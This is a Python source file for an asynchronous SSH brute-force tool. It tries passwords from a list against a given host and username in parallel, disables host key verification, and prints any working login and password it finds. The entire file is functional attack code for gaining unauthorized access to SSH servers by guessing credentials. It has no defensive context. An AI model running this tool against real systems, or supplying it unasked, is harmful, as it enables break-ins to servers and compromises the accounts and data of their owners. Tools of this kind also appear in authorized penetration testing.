import asyncio
import asyncssh
from termcolor import colored
from datetime import datetime
from os import path

async def _attempt_ssh_login(hostname, port, username, password, found_flag):
    """
    Try SSH login. If successful, set found_flag and print success.
    """
    try:
        async with asyncssh.connect(
            hostname, 
            port=port, 
            username=username, 
            password=password, 
            known_hosts=None
        ):
            found_flag.set()
            print(colored(
                f"[{port}] [ssh] HOST: {hostname} | LOGIN: {username} | PASS: {password}",
                'green'
            ))
            return password
    except Exception:
        # Print attempt info on failure
        print(f"[Attempt] {hostname} | login: {username} | password: {password}")
    return None


async def _async_bruteforce_ssh(hostname, port, username, password_list, concurrency_limit=10):
    """
    Test a list of passwords for 'username'. concurrency_limit is how many run in parallel.
    Returns found password or None.
    """
    tasks = []
    found_flag = asyncio.Event()
    found_password = None
    counter = 0

    for password in password_list:
        # Stop if found
        if found_flag.is_set():
            break

        # Create a task
        tasks.append(
            asyncio.create_task(_attempt_ssh_login(hostname, port, username, password, found_flag))
        )
        counter += 1

        # If limit reached, wait for a result
        if counter >= concurrency_limit:
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            # Check for success in completed tasks
            for d in done:
                result = d.result()
                if result is not None:
                    found_password = result
                    found_flag.set()
                    break
            # Keep only pending tasks
            tasks = list(pending)
            counter = len(tasks)

    # Wait for remaining tasks
    done, _ = await asyncio.wait(tasks)
    # Check if any was successful
    for d in done:
        result = d.result()
        if result is not None:
            found_password = result
            break

    return found_password


def ssh_brute_force_async(hostname, port, username, password_list, concurrency_limit=10):
    """
    Sync wrapper for the async brute force. Returns password or None.
    """
    print("\n---------------------------------------------------------")
    print(colored(f"[*] SSH brute force started at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n")

    # Check password list
    if not password_list:
        print(colored("[-] No passwords in list!", "red"))
        return None

    # Run async
    found_password = asyncio.run(
        _async_bruteforce_ssh(hostname, port, username, password_list, concurrency_limit=concurrency_limit)
    )

    if found_password:
        print(colored(f"\n[+] Password found: {found_password}", "green"))
        return found_password
    else:
        print(colored("\n[-] No valid password found.", "red"))
        return None
